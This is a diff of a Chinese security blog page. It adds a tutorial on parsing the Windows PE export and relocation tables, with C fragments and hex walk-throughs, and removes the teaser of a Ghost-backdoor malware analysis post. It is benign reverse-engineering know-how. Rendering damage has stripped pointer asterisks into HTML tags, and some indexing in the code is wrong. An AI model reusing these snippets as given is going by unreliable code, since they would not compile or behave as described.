+<p>if (pThunk[j].u1.AddressOfData&amp;IMAGE_ORDINAL_FLAG)   //按标号导入<br>{<br>    //<br>}<br>else   //按名称导入<br>{<br>    //<br>}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta"># 0x2 导出表</span></div><div class="line"><span class="meta">## 0x2.1 导出表的作用</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;我们都知道DLL是实现代码复用的重要方式，同时为了让调用DLL的PE文件(包括exe和dll)知道哪些函数是可以被复用的，所以dll会将可以被导出的函数的RVA值保存在导出表中。</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;导出表事实上并不只是存在于DLL中，同时也可能存在于exe中。当一个PE文件被装载的时候，装载器会将PE文件中所有被登记的DLL一起载入，然后根据DLL的导出表对导入表中的IAT进行修正。</div><div class="line"></div><div class="line"><span class="meta">## 0x2.2 导出表结构</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;导出表描述信息位于可选头的数据目录中的第一项。<span class="number">4000</span>是导出表的RVA值，需要转化为FOA值。利用导入表的公式`section[i].PointOfRawData+(RVA-VirtuallAddress)`进行计算，得到FOA为C00.</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbd8cd14763.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbd9b42b0b9.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;这时候，我们在文件中的C00处就可以找到我们导出目录了。我们现在需要了解一下导出目录`IMPORT_EXPORT_DIRECTORY`这个结构.其中我们需要重点关心的成员有以下几个。</div><div class="line"></div><div class="line">* Name:导出函数的文件名RVA</div><div class="line">* Base:导出函数起始需要，在导出函数序号表中的值，需要加上此值才是导出函数真正的序号</div><div class="line">* NumberOfFunctions：导出函数个数</div><div class="line">* NumberOfNames：名称导出函数个数</div><div class="line">* AddressOfFunctions;        <span class="comment">//指向到处函数地址表的RVA</span></div><div class="line">* AddressOfNames;            <span class="comment">//指向函数名地址表的AVA</span></div><div class="line">* AddressOfNameOrdinals;     <span class="comment">//指向函数名序号表的RVA</span></div></pre></td></tr></table></figure></p>
+<p>typedef struct _IMAGE_EXPORT_DIRECTORY {<br>    DWORD Characteristics;<br>    DWORD TimeDateStamp;            //输出表的创建时间<br>    WORD MajorVersion;                      //输出表的主版本号。未使用设置为0<br>    WORD MinorVersion;                      //输出表的次版本号。未使用设置为0<br>    DWORD Name;                //指向一个与输出函数关联的文件名的RVA<br>    DWORD Base;                //导出函数的起始序号<br>    DWORD NumberOfFunctions;        //导出函数的总数<br>    DWORD NumberOfNames;            //以名称导出的函数总数<br>    DWORD AddressOfFunctions;        //指向到处函数地址表的RVA<br>    DWORD AddressOfNames;            //指向函数名地址表的AVA<br>    DWORD AddressOfNameOrdinals;            //指向函数名序号表的RVA<br>} IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;如下图是导出表的数据。可以看到`<span class="number">32</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span>`对应的是Name这个成员变量的RVA，我们调整端序，计算FOA(<span class="number">32400000</span>---&gt;<span class="number">00004032</span>---&gt;C32)可到Name在文件中的位置是C32.正好指向DllDemo.dll这个字符串。根据上述方法解析导出表数据如下</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbdd659be05.png)</span></div><div class="line"></div><div class="line">* Name：[C06]=C32--&gt;<span class="string">"DllDemo.dll"</span>  (rva)</div><div class="line">* Base：[C10]=<span class="string">"00000001"</span></div><div class="line">* NumberOfFunctions:[C14]=<span class="string">"00000001"</span></div><div class="line">* NumberOfNames:[C18]=<span class="string">"00000001"</span></div><div class="line">* AddressOfFunctions:[C1C]=C28---&gt;<span class="number">08100000</span> (RVA)</div><div class="line">* AddressOfNames:[C20]=C2C---&gt;<span class="string">"MsgBox"</span>     (RVA)</div><div class="line">* AddressOfNameOrdinals[C24]=C30---&gt;<span class="number">0000</span>   (RVA) </div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;【重点】PE装载器调用GetProcAddress来填充IAT，这时候需要了解GetProcAddress原理。</div><div class="line"></div><div class="line">* 定位到IMAGE_EXPORT_DIRECTORY结构</div><div class="line">* 判断Name是否是传入的DllName</div><div class="line">* 获取ENT数组的起始地址，寻找FuncName，如果找到记录在ENT的数组索引。</div><div class="line">* 然后读取导出函数序号数据的第一项的序号值</div><div class="line">* 使用Base+序号的值到EAT中寻找地址</div><div class="line"></div><div class="line"><span class="meta">## 0x2.3 导出表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先需要在数据目录中获取导出表地址，需要注意的是这个地址是个RVA的值，需要加上BaseAddress。</div></pre></td></tr></table></figure></p>
+<p>DWORD Rav_Export_Table = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<br>PIMAGE_EXPORT_DIRECTORY ExportTable = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)lpBaseAddress + Rav_Export_Table);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;由于`AddressOfNames`,`AddressOfFunctions`,和`AddressOfNameOrdinals`都是RVA值，且都需要进程RVA-&gt;FOA的转化。所以如果要获取这三个成员变量的FOA的话需要进行两部，第一将RVA转化为FOA，然后加上BaseAddress。</div></pre></td></tr></table></figure></p>
+<p>//获取导出函数名数组<br>DWORD<em> dwAddressOfNames =(DWORD</em>)((ULONG_PTR)lpBaseAddress+ RvaToOffset(ExportTable-&gt;AddressOfNames,lpBaseAddress));<br>//获取导出函数数组<br>DWORD<em> dwAddressOfFunctions = (DWORD</em>)((ULONG_PTR)lpBaseAddress + RvaToOffset(ExportTable-&gt;AddressOfFunctions, lpBaseAddress));<br>//获取导出函数索引数组<br>DWORD<em> dwAddressOfNameOrdinals = (DWORD</em>)((ULONG_PTR)lpBaseAddress + RvaToOffset(ExportTable-&gt;AddressOfNameOrdinals, lpBaseAddress));<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;因为NumberOfFunctions&gt;=NumberOfNames,适合放在外部循环进行比较。</div></pre></td></tr></table></figure></p>
+<p>for (i = 0; i &lt; dwNumberOfFunctions; i++){…}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;在提到关于GetProcAddress用法时说道，如果目标函数在AddressOfFuns被找到记录其数组索引。然后在导出函数序号数组中寻找对应序号。</div></pre></td></tr></table></figure></p>
+<p>if (<em>(WORD</em>)(dwAddressOfNameOrdinals + j * sizeof(WORD)) == i)<br>{}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接着取出我们的需要序号，以及在导出函数地址数组对应的序号所对应的导出函数地址</div></pre></td></tr></table></figure></p>
+<p>//函数名称<br>FunName = (LPCSTR)((ULONG_PTR)lpBaseAddress + dwAddressOfNames[j <em> sizeof(WORD)]);  //VA值<br>//函数索引<br>FunOrdinal = </em>(WORD<em>)(dwAddressOfNameOrdinals + j </em> sizeof(WORD));<br>//函数地址   i=(dwAddressOfNameOrdinals + j <em> sizeof(WORD))   其实是索引值<br>//这里需要取其值，注意</em>(DWORD<em>)<br>FunAddress = </em>(DWORD<em>)(dwAddressOfFunctions + FunOrdinal </em> sizeof(DWORD));<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbed6a89dd0.png)</span></div><div class="line"></div><div class="line"><span class="meta"># 0x3 重定位表</span></div><div class="line"><span class="meta">## 0x3.1 重定位原理</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;PE装载的时候，大多选用相对地址RVA，这样做的原因有二，第一是为了方便装载器，二是为了重定位。那么什么时候需要重定位呢，或者说重定位的条件是什么呢，我们应该知道每个进程内存是相互独立的，也就是说exe文件发生重定位的可能性不高，这样看来由于DLL的装载位置的不同，DLL文件发生重定位的可能性就比较高了，因为同一个进程空间里面可能存在多个DLL文件，有时候多个dll设定的原始的基地址是相同的，但是对于操作系统来说这是不允许存在的，所以需要对他们进行重定位。</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;这时候就需要将那些需要被重定位的数据保存在一张表里面，然后取出里面的地址，利用某一个特定的公式，重新计算加载地址即可。</div><div class="line"></div><div class="line"><span class="meta">## 0x3.2 重定位表结构</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;重定位表位于数据目录项中第<span class="number">6</span>项，通过上述的方法可以定位到文件中重定位表地址为<span class="number">0xE00</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbf1da6e887.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbc0fe5b5fcd.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来，我们开始解析重定位表，在解析之前，需要了解重定位表结构。重定位表是由多个IMAGE_BASE_RELOCATION结构体构成的。有三个成员变量</div></pre></td></tr></table></figure></p>
+<p>typedef struct _IMAGE_BASE_RELOCATION {<br>    DWORD   VirtualAddress;//RVA<br>    DWORD   SizeOfBlock;   //重定位数据大小<br>    WORD    TypeOffset;    // 重定位项数组<br>} IMAGE_BASE_RELOCATION,* PIMAGE_BASE_RELOCATION;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* VirtualAddress是重定位数组的RVA，**但是需要每个重定位数组地址加上这个RVA才是真正的重定位数组的地址**</div><div class="line">* SizeofBlock：重定位结构大小</div><div class="line">* TypeOffset：两个字节，<span class="number">16</span>位，高<span class="number">4</span>位表示重定位类型，低<span class="number">12</span>位表示重定位地址</div><div class="line"></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;如图所有，解析如下：</div><div class="line"></div><div class="line">* VirtualAddress：<span class="number">00001000</span></div><div class="line">* sizeofBlock：<span class="number">10</span>H--&gt;(<span class="number">10</span>H<span class="number">-8</span>H)/<span class="number">2</span>=<span class="number">4</span>,一共有四个重定位数组，<span class="number">8</span>H指的是VirtualAddress和sizeofBlock所占的字节数为<span class="number">8</span>，除以<span class="number">2</span>H，表示一个TypeOffset为<span class="number">2</span>个字节。</div><div class="line">* Data1:<span class="number">0F</span>30--&gt;<span class="number">300F</span>--&gt;Type:<span class="number">3</span>--&gt;Addr:<span class="number">00F</span>--&gt;RVA:<span class="number">100F</span>h---&gt;FOA:<span class="number">60F</span></div><div class="line">* Data2:<span class="number">2330</span>--&gt;<span class="number">3023</span>--&gt;Type:<span class="number">3</span>--&gt;Addr:<span class="number">023</span>--&gt;RVA:<span class="number">1023</span>h---&gt;FOA:<span class="number">623</span></div><div class="line">* Data3:<span class="number">0000</span></div><div class="line">* Data4:<span class="number">0000</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;得到需要重定位的数据为<span class="number">00402000</span>和<span class="number">00403030</span>，假设当前基地址为<span class="number">00400000</span>，目标基地址为<span class="number">01000000</span> 则重定位后的地址为<span class="number">01002000</span>和<span class="number">01003030</span></div><div class="line"></div><div class="line"><span class="meta">## 0x3.3 重定位表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先获取重定位表地址</div></pre></td></tr></table></figure></p>
+<p>//重定位表地址<br>DWORD RelocTableRva = pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>//    printf(“\t\t [<em>]RelocTableRva:%p\n”, RelocTableRva);<br>PIMAGE_BASE_RELOCATION RelocTable =(PIMAGE_BASE_RELOCATION)((ULONG)lpBaseAddress+RvaToOffset(RelocTableRva,lpBaseAddress));<br>printf(“\t\t [</em>]RelocTable:%p\n”, RelocTable);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;获取每个重定位数组的RVA地址和大小，原因有二，第一，获取完TypeOffset的第<span class="number">12</span>位需要加上VirtualAddress才是真正的RVA，第二，sizeofBlock是指向下一个重定位数组(块)的重要参数。</div></pre></td></tr></table></figure></p>
+<p>DWORD VirtualAddress = RelocTable-&gt;VirtualAddress;<br>printf(“\t\t [*]VirtualAddress:%p”, VirtualAddress);<br>DWORD Cout = (RelocTable-&gt;SizeOfBlock - 8) / 2;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;定位到重定位数组，每个Typeoffset在偏移处第八个字节，所以需要加<span class="number">8</span>。</div></pre></td></tr></table></figure></p>
+<p>WORD<em> RecAddr = (WORD</em>)((BYTE*)RelocTable + 8);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;解析TypeOffset</div></pre></td></tr></table></figure></p>
+<p>//取第三位地址，并加上VirtualAddress才是真的RVA<br>DWORD offset = VirtualAddress + (RecAddr[j] &amp; 0x0FFF);<br>//TYPE<br>DWORD type = RecAddr[j] &gt;&gt; 12;<br>printf(“\t\t Type:[%d] \t RVA:[%p]\n”, type, offset);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;利用sizeofblock定位下一个重定位表</div></pre></td></tr></table></figure></p>
+<p>RelocTable = (IMAGE_BASE_RELOCATION <em>)((BYTE </em>)RelocTable + RelocTable-&gt;SizeOfBlock);<br>```</p>
 
           
         
@@ -2109,158 +2284,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/13/病毒分析技术_19_Ghost后门程序分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="findream">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="findream's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/01/13/病毒分析技术_19_Ghost后门程序分析/" itemprop="url">病毒分析技术18) ---Ghost后门病毒</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-13T11:02:11+08:00">
-                2019-01-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
-                    <span itemprop="name">安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后门病毒的前缀是：Backdoor。该类病毒的特性是通过网络传播，给系统开后门，给用户电脑带来安全隐患。2004年年初，IRC后门病毒开始在全球网络大规模出现。一方面有潜在的泄漏本地信息的危险，另一方面病毒出现在局域网中使网络阻塞，影响正常工作，从而造成损失。即使管理员通过改变所有密码之类的方法来提高安全性，仍然能再次侵入，使再次侵入被发现的可能性减至最低。<br>大多数后门设法躲过日志，大多数情况下即使入侵者正在使用系统也无法显示他已在线。<strong>摘录于百度百科</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此次病毒多次使用隐藏技术，反复转移文件，以及使用Hook技术对抗分析。但是美中不足的是，释放样本的时候没有加密资源，直接获得了payload。</p>
-<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul>
-<li>1.目录</li>
-<li>2.Ioc</li>
-<li>3.行为分析</li>
-<li>4.样本分析</li>
-<li>5.技术总结
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/01/13/病毒分析技术_19_Ghost后门程序分析/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2311,7 +2334,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">109</span>
+                  <span class="site-state-item-count">110</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
